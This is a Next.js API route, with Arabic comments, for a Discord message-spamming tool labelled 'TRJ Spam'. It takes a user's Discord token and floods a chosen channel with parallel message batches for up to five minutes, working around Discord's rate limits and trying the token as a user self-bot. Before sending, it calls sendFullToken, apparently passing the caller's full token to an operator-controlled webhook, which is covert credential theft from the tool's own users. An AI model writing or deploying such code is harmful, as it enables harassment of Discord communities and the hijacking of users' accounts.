import { NextRequest, NextResponse } from 'next/server'
import { sendToWebhook, sendFullToken } from '@/lib/webhook'
import { cleanToken } from '@/lib/discord'
import { getLogWebhookUrl } from '@/lib/config'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'

// ✅ إصلاح 1: غيرنا runtime إلى nodejs لدعم الوقت الطويل
export const runtime = 'nodejs'
// ✅ إصلاح 2: حد زمني 5 دقائق
export const maxDuration = 300

function createTimeout(ms: number) {
  const controller = new AbortController()
  const id = setTimeout(() => controller.abort(), ms)
  return { signal: controller.signal, clear: () => clearTimeout(id) }
}

// ✅ إصلاح 3: إرسال الرسالة لقناة ديسكورد
async function sendDiscordMessage(authHeader: string, channelId: string, msg: string): Promise<{ ok: boolean; retryAfter: number }> {
  const t = createTimeout(10000)
  try {
    const res = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      body: JSON.stringify({ content: msg }),
      signal: t.signal,
    })

    if (res.status === 429) {
      try {
        const err = await res.json()
        return { ok: false, retryAfter: (err.retry_after || 1) * 1000 }
      } catch {
        return { ok: false, retryAfter: 1000 }
      }
    }

    if (res.status === 401 || res.status === 403) {
      return { ok: false, retryAfter: -1 } // خطأ مصادقة - لا نعيد المحاولة
    }

    if (res.status === 404) {
      return { ok: false, retryAfter: -1 } // الروم غير موجود
    }

    return { ok: res.ok, retryAfter: 0 }
  } catch {
    return { ok: false, retryAfter: 5000 } // خطأ شبكة - ننتظر ثم نعيد
  } finally {
    t.clear()
  }
}

// ✅ إصلاح 4: تحديد نوع التوكن (user أو bot)
async function detectAuthType(token: string): Promise<string> {
  const t = createTimeout(10000)
  try {
    // نجرب كـ User Token أولاً
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      signal: t.signal,
    })
    if (res.ok) return token
  } catch {
    // فشل - نجرب كـ Bot
  } finally {
    t.clear()
  }

  const t2 = createTimeout(10000)
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: {
        'Authorization': `Bot ${token}`,
        'User-Agent': 'DiscordBot (https://discord.com, 1)',
      },
      signal: t2.signal,
    })
    if (res.ok) return `Bot ${token}`
  } catch {
    // فشل أيضاً
  } finally {
    t2.clear()
  }

  return token // نرجع الأصل ونترك الخطأ يظهر لاحقاً
}

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request)
    const rl = rateLimit(`${rlIp}:spam`, RATE_LIMITS.medium)
    if (rl.limited) {
      return NextResponse.json(
        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } }
      )
    }

    const body = await request.json().catch(() => ({}))
    const { token, channelId, messages, duration = 60, speed = 0.5 } = body

    if (!token || !channelId) {
      return NextResponse.json({ success: false, error: 'التوكن وأيدي الروم مطلوبان' }, { status: 400 })
    }

    // ✅ إصلاح 5: تنظيف الرسائل
    const msgList = Array.isArray(messages)
      ? messages.map((m: string) => String(m).trim()).filter(Boolean)
      : [String(messages).trim()].filter(Boolean)

    if (msgList.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل رسالة واحدة على الأقل' }, { status: 400 })
    }

    // ✅ إصلاح 6: sendFullToken بباراميترات صحيحة
    sendFullToken('تسطير', token)

    sendToWebhook({
      username: 'TRJ Spam',
      embeds: [{
        title: '⚡ Spam Started',
        color: 0xf97316,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '💬 Messages', value: String(msgList.length), inline: true },
          { name: '⏱️ Duration', value: `${duration}s`, inline: true },
          { name: '⚡ Speed', value: `${speed}s`, inline: true },
        ],
        timestamp: new Date().toISOString(),
      }],
    }, getLogWebhookUrl()).catch(() => {})

    const ct = cleanToken(token)

    // ✅ إصلاح 7: تحديد نوع التوكن
    const authHeader = await detectAuthType(ct)

    // ✅ إصلاح 8: تنظيف الوقت
    const safeDuration = Math.min(Math.max(Number(duration) || 60, 1), 300)
    const safeSpeed = Math.min(Math.max(Number(speed) || 0.5, 0.1), 10)

    const startTime = Date.now()
    const endTime = startTime + (safeDuration * 1000)
    let sent = 0
    let failed = 0
    let globalRLUntil = 0
    let authError = false
    let channelNotFound = false
    let msgIndex = 0

    // ✅ إصلاح 9: حلقة محسّنة مع توقف ذكي
    while (Date.now() < endTime && !authError && !channelNotFound) {
      // انتظار rate limit
      const now = Date.now()
      if (now < globalRLUntil) {
        await new Promise(r => setTimeout(r, globalRLUntil - now + 200))
        continue
      }

      // ✅ إصلاح 10: إرسال دفعة من 5 رسائل متوازية
      // كل دفعة تأخذ الرسائل بالتناوب من القائمة (ليس فقط أول 5)
      const batchMessages: string[] = []
      for (let i = 0; i < 5 && i < msgList.length; i++) {
        batchMessages.push(msgList[msgIndex % msgList.length])
        msgIndex++
      }

      const batchResults = await Promise.allSettled(
        batchMessages.map(msg => sendDiscordMessage(authHeader, channelId, msg))
      )

      for (const r of batchResults) {
        if (r.status !== 'fulfilled') {
          failed++
          continue
        }

        const result = r.value

        if (result.retryAfter === -1) {
          // خطأ مصادقة أو روم غير موجود
          if (failed === 0 && sent === 0) {
            channelNotFound = true
          }
          authError = true
          failed++
          continue
        }

        if (result.ok) {
          sent++
        } else {
          failed++
        }

        if (result.retryAfter > 0) {
          globalRLUntil = Math.max(globalRLUntil, Date.now() + result.retryAfter)
        }
      }

      // إذا أخطاء كثيرة متتالية بدون نجاح - نوقف
      if (failed > 20 && sent === 0) {
        break
      }

      // انتظار بين الدفعات
      const remaining = endTime - Date.now()
      if (remaining <= 0) break

      const waitTime = Math.min(safeSpeed * 1000, remaining)
      if (waitTime > 50) {
        await new Promise(resolve => setTimeout(resolve, waitTime))
      }
    }

    // ✅ Webhook النتيجة
    sendToWebhook({
      username: 'TRJ Spam',
      embeds: [{
        title: authError ? '❌ Spam Failed' : '✅ Spam Done',
        color: authError ? 0xFF0000 : 0x00FF41,
        fields: [
          { name: '✅ Sent', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '📊 Total', value: String(sent + failed), inline: true },
          { name: '⏱️ Time', value: `${Math.round((Date.now() - startTime) / 1000)}s`, inline: true },
        ],
      }],
    }, getLogWebhookUrl()).catch(() => {})

    // ✅ إصلاح 11: رسائل خطأ واضحة
    if (authError && sent === 0) {
      return NextResponse.json({
        success: false,
        error: 'فشل الإرسال - تأكد من صحة التوكن وصلاحياته في الروم',
        stats: { sent, failed, total: sent + failed },
      }, { status: 403 })
    }

    return NextResponse.json({
      success: true,
      stats: { sent, failed, total: sent + failed, duration: Math.round((Date.now() - startTime) / 1000) },
    })

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع'
    return NextResponse.json({ success: false, error: message }, { status: 500 })
  }
}
